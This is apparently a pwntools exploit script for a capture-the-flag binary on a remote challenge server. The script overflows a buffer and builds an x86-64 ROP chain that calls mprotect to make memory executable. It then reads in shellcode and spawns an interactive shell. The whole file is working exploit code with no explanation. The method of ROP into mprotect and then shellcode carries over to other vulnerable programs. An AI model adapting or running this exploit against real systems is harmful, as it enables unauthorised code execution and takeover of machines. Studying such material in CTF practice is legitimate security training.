from pwn import *
context(arch='amd64', os='linux', log_level='debug')

p_rdi = 0x00000000004001b9
p_rsi = 0x00000000004001c2
p_rdx = 0x00000000004001a5
syscall = 0x000000000040019b
read = 0x0000000000400130
write = 0x000000000040013D

#r = process("./level4.1-rop_x64")
r = remote("pwn.sixstars.team", 23004)

r.recv()

sh = 'a'*0x10 
sh += p64(syscall)  # init rcx
sh += p64(p_rsi) + p64(0x400000)
sh += p64(p_rdx) + p64(0x400000)
sh += p64(p_rdi) + p64(1)
sh += p64(p_rdx) + p64(0xa)
sh += p64(write)        # control rax to 0xa

sh += p64(p_rsi) + p64(0x400000)
sh += p64(p_rdx) + p64(0x400000)
sh += p64(p_rdi) + p64(0x400000)
sh += p64(p_rdx) + p64(0x7)
sh += p64(syscall)      # mprotect

sh += p64(p_rsi) + p64(0x400800)
sh += p64(p_rdx) + p64(0x400000)
sh += p64(p_rdi) + p64(0)
sh += p64(read)

sh += p64(0x400800)


r.sendline(sh)

r.sendline(asm(shellcraft.sh(), arch='amd64'))


r.interactive()
